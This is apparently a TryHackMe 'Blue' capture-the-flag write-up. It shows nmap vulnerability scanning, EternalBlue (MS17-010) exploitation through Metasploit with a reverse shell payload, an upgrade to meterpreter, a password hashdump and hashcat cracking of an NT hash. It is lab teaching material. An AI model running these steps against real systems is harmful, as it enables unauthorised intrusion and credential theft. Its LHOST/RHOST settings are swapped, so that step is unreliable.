# TryHackMe_BLUE

### Overview

Metasploit runs on Unix (including Linux and macOS) and on Windows. The Metasploit Framework can be extended to use add-ons in multiple languages.

The basic steps for exploiting a system using the Framework include.

1. Optionally checking whether the intended target system is vulnerable to an exploit.
2. Choosing and configuring an exploit (code that enters a target system by taking advantage of one of its bugs; about 900 different exploits for Windows, Unix/Linux and macOS systems are included).
3. Choosing and configuring a payload (code that will be executed on the target system upon successful entry; for instance, a remote shell or a VNC server). Metasploit often recommends a payload that should work.
4. Choosing the encoding technique so that hexadecimal opcodes known as "bad characters" are removed from the payload, these characters will cause the exploit to fail.
5. Executing the exploit.

This modular approach – allowing the combination of any exploit with any payload – is the major advantage of the Framework. It facilitates the tasks of attackers, exploit writers and payload writers.

To choose an exploit and payload, some information about the target system is needed, such as operating system version and installed network services. This information can be gleaned with port scanning and TCP/IP stack fingerprinting tools such as Nmap. Vulnerability scanners such as Nessus, and OpenVAS can detect target system vulnerabilities. Metasploit can import vulnerability scanner data and compare the identified vulnerabilities to existing exploit modules for accurate exploitation

### Practice

On TryHackMe there is a room to help users practice learning about metasploit [Link Here](https://tryhackme.com/room/blue)


We start the lab.

#### Recon

We first need to determine what damage is on the target by scanning `nmap`.
> nmap -sV -vv --script vuln <Ip_victim>

*-sV: version detection*

*-vv: shows the level of detail*

*--script vuln: These scripts check for specific known vulnerabilities and generally only report results if they are found*

![image](https://user-images.githubusercontent.com/63194321/147560340-55189387-930b-4605-b37a-dcf07ce1b63b.png)
![image](https://user-images.githubusercontent.com/63194321/147560843-2a1b95d1-cdb7-4256-b106-648f92649805.png)
![image](https://user-images.githubusercontent.com/63194321/147560632-6af1deb1-80a8-4973-94f8-66c6a8358d35.png)

As you can see, we have scanned for a vulnerability `ms17-010` that allows us to be able to remote code execution.

#### Gain Access


After finding an accessible vulnerability, we can use `metasploit` to launch an attack.

**Step1:** Open `metasploit`.
> msfconsole

Interface of `metasploit`:

![image](https://user-images.githubusercontent.com/63194321/147561220-8a4831d7-3f93-42e2-af04-d876d707e783.png)

**Step2:** Look for ways to attack vulnerabilities with known names.
> search <name_vulnerabilities>

![image](https://user-images.githubusercontent.com/63194321/147561451-902938d4-621c-424d-b5b0-3ce64d4aff79.png)

**Step3:** Select the module to conduct the attack.

Here we attack the module `eternalblue`.

*EternalBlue exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol*
> use 0 `or` use exploit/windows/smb/ms17_010_eternalblue

![image](https://user-images.githubusercontent.com/63194321/147561926-15aa4a8a-17a8-4b4c-8ea4-cc3693792e3d.png)

**Step3:** We set the payload so that the module can perform the exploit.
> set LHOSTS <victim_ip>
> 
> set payload windows/x64/shell/reverse_tcp
> 
> set RHOST <attack_ip>

![image](https://user-images.githubusercontent.com/63194321/147562379-850a66b9-f3a3-44be-bf71-68d1def5318b.png)

*`tun0` here is TryHackMe's vpn network.*

**Step5:** Exploit
> exploit `or` run

![image](https://user-images.githubusercontent.com/63194321/147562829-03c1adcf-ea70-46c3-9402-a92299865c94.png)

#### Escalate 

Once we have access to the victim's shell, we will upgrade to the `meterpreter` shell.

**Step1:** Looking for module meterpreter
> search shell_to_meterpreter

![image](https://user-images.githubusercontent.com/63194321/147563543-7d1249d8-8686-458e-9490-6811c2c33231.png)

**Step2:** Using the module `shell_to_meterpreter`
> use 0 `or` use post/multi/manage/shell_to_meterpreter

![image](https://user-images.githubusercontent.com/63194321/147563720-ff9a4a2e-0014-4415-a308-eb6aae541549.png)

**Step3:** Check the options that can be changed.
> options `or` show options

![image](https://user-images.githubusercontent.com/63194321/147563859-cda8c737-9f15-4a05-86ee-a7761c70bf48.png)

_Here we can see that the `sessions` entry can be changed._

**Step4:** Perform the set `session` of the payload
> set session 1

![image](https://user-images.githubusercontent.com/63194321/147567289-d33d8c64-26f1-408e-8797-75009b6da188.png)

**Step5:** Exploit!
> exploit

![image](https://user-images.githubusercontent.com/63194321/147568114-2575523d-bb0e-46bc-a599-c4434eb73520.png)

**Step6:** Implement the `meterpreter` shell by:
> sessions -i <meterpreter-session-no.>

![image](https://user-images.githubusercontent.com/63194321/147568338-109e23d3-da61-4bcb-a0cc-890169e4877b.png)

**Step7:** Verify `meterpreter` has run successfully.

![image](https://user-images.githubusercontent.com/63194321/147568607-5d8f8927-ed66-4c0f-a76d-88035cad6d31.png)

**Step8:** List processes via `ps` . command
> ps

![image](https://user-images.githubusercontent.com/63194321/147568791-72be7b9f-ffd3-494f-8a90-f3fb883dce98.png)

We can move to a running process via the command:
> migrate <PROCESS_ID>

![image](https://user-images.githubusercontent.com/63194321/147569011-96c8940e-1d61-42d9-b38c-279137d273b6.png)

#### Cracking

We can use `meterpreter` to quickly search for hashed user passwords.
> hashdump

![image](https://user-images.githubusercontent.com/63194321/147569248-27f18c71-f91f-449b-bb06-17a7c2831ecc.png)

Looking at the hashdump above we can break one of them down into it’s component parts:
> user: Jon
> 
> RID: 1000
> 
> LM hash: aad3b435b51404eeaad3b435b51404ee
> 
> NT hash: ffb43f0de35be4d9917ac0cc8ad57f8d

We will need `user` and `NT hash` as well as hashcat to perform password cracking.

**Step1:** Save information to file `hash.txt`

![image](https://user-images.githubusercontent.com/63194321/147571174-b3f84203-3509-4595-9d61-58e067610ed8.png)

**Step2:** Use `hashcat` to crack the password.
> hashcat --username --show -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

_--username: Enable ignoring of usernames in hashfile_
_--show: Show cracked passwords only_
_-a 0: attack mode_
_-m 1000: hashtype_

![image](https://user-images.githubusercontent.com/63194321/147571222-e7b5319d-9ff3-401f-8cc9-5b9937e1942e.png)

####  Find flags!

The first flag is located in the system root. So we can use shell to drive `C:\` to find.

![image](https://user-images.githubusercontent.com/63194321/147571478-493531ca-4d44-4704-924d-2e93bc979b90.png)

We can use `type` to read data.
> type <name_of_file>

![image](https://user-images.githubusercontent.com/63194321/147571588-b2f9cde3-8858-498f-9f40-64be1f70ea9f.png)

After finding the first plag we define the flag format as `plag*txt` so we will look above `shell meterpreter`.
> search -f flag*txt

![image](https://user-images.githubusercontent.com/63194321/147571837-8c5807f9-ab80-4c1f-a419-13989d1bfb43.png)

### Thanks for reading the whole post!

#### Reference 

Room TryHackMe: [https://tryhackme.com/room/blue ](https://tryhackme.com/room/blue)

Meterpreter: [https://www.hackingarticles.in/command-shell-to-meterpreter/](https://www.hackingarticles.in/command-shell-to-meterpreter/)

HashCat: [https://tbhaxor.com/cracking-passwords-using-hashcat/](https://tbhaxor.com/cracking-passwords-using-hashcat/)




